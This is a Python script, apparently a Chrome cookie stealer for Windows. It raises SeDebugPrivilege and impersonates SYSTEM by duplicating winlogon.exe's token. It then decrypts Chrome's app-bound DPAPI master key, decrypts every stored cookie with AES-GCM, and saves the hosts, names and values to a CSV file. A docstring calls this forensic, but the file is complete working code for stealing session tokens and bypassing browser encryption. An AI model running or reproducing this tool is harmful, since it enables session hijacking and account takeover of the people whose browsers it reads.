import os
import json
import base64
import sqlite3
import shutil
import ctypes
import sys
import csv
import win32crypt
import win32security
import win32api
import win32con
import psutil
from Cryptodome.Cipher import AES

USER_DATA_DIR = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data")


def enable_debug_privilege():
    try:
        h_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(),
                                                 win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
        priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        win32security.AdjustTokenPrivileges(h_token, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
        return True
    except Exception as e:
        print(f"[-] SeDebugPrivilege: {e}")
        return False


def impersonate_system():
    target_pid = None
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'].lower() == 'winlogon.exe':
            target_pid = proc.info['pid']
            break
    if not target_pid:
        return False
    try:
        enable_debug_privilege()
        h_proc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, target_pid)
        h_tok = win32security.OpenProcessToken(h_proc, win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY)
        new_tok = win32security.DuplicateTokenEx(h_tok, win32security.SecurityImpersonation,
                                                 win32security.TOKEN_ALL_ACCESS, win32security.TokenPrimary)
        win32security.ImpersonateLoggedOnUser(new_tok)
        return True
    except Exception as e:
        print(f"[-] Impersonation failed: {e}")
        return False


def get_master_key(user_data_dir=None):
    """Extracts the AES-256 master key via two-stage DPAPI unwrapping."""
    if user_data_dir is None:
        user_data_dir = USER_DATA_DIR
    local_state_path = os.path.join(user_data_dir, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        ls = json.load(f)
    os_crypt = ls.get("os_crypt", {})

    if "app_bound_encrypted_key" in os_crypt:
        raw_key = base64.b64decode(os_crypt["app_bound_encrypted_key"])[4:]
        s1 = None
        if impersonate_system():
            try:
                s1 = win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]
            finally:
                win32security.RevertToSelf()
        if s1 is None:
            raise RuntimeError("SYSTEM impersonation failed; cannot decrypt Chrome master key.")
        return win32crypt.CryptUnprotectData(s1, None, None, None, 0)[1][-32:]
    else:
        return win32crypt.CryptUnprotectData(
            base64.b64decode(os_crypt["encrypted_key"])[5:], None, None, None, 0)[1]


def extract_chrome_cookies(user_data_dir=None):
    """
    Extracts and decrypts Chrome cookies directly from the SQLite database using
    the two-stage DPAPI master key — no CDP / headless browser launch required.
    Chrome blocks the remote-debugging port when the process runs elevated (admin),
    so direct decryption is the only reliable method in a forensic context.

    Returns a list of (host, name, value) tuples.
    """
    if user_data_dir is None:
        user_data_dir = USER_DATA_DIR

    print("[*] Starting Chrome Cookie Extraction (Direct Decrypt)...")

    master_key = get_master_key(user_data_dir)
    print(f"[+] Master key extracted: {len(master_key)} bytes")

    # Chrome stores cookies at Default\Network\Cookies (Chrome 96+)
    # Fall back to Default\Cookies for older installs
    for rel_path in (os.path.join("Default", "Network", "Cookies"),
                     os.path.join("Default", "Cookies")):
        cookie_db = os.path.join(user_data_dir, rel_path)
        if os.path.exists(cookie_db):
            break
    else:
        print("[-] Cookies database not found.")
        return []

    temp_db = "temp_chrome_cookies_standalone.db"
    shutil.copyfile(cookie_db, temp_db)
    results = []
    try:
        conn = sqlite3.connect(temp_db)
        cur = conn.cursor()
        cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
        for host, name, enc_val in cur.fetchall():
            try:
                iv = enc_val[3:15]
                payload = enc_val[15:]
                ciphertext, tag = payload[:-16], payload[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                value = cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="ignore")
            except Exception:
                value = "[Encrypted]"
            results.append({"host_key": host, "name": name, "value": value})
        conn.close()
        print(f"[+] Extracted {len(results)} Chrome cookies.")
    finally:
        try:
            os.remove(temp_db)
        except OSError:
            pass
    return results


def save_cookies_report(data, out_file="chrome_cookies_report.csv"):
    """Saves extracted cookie list to a CSV report file."""
    if not data:
        print("[-] No cookie data to save.")
        return
    with open(out_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["host_key", "name", "value"], extrasaction='ignore')
        writer.writeheader()
        writer.writerows(data)
    print(f"[+] {len(data)} cookies saved to {out_file}")


if __name__ == "__main__":
    cookie_data = extract_chrome_cookies()
    save_cookies_report(cookie_data)
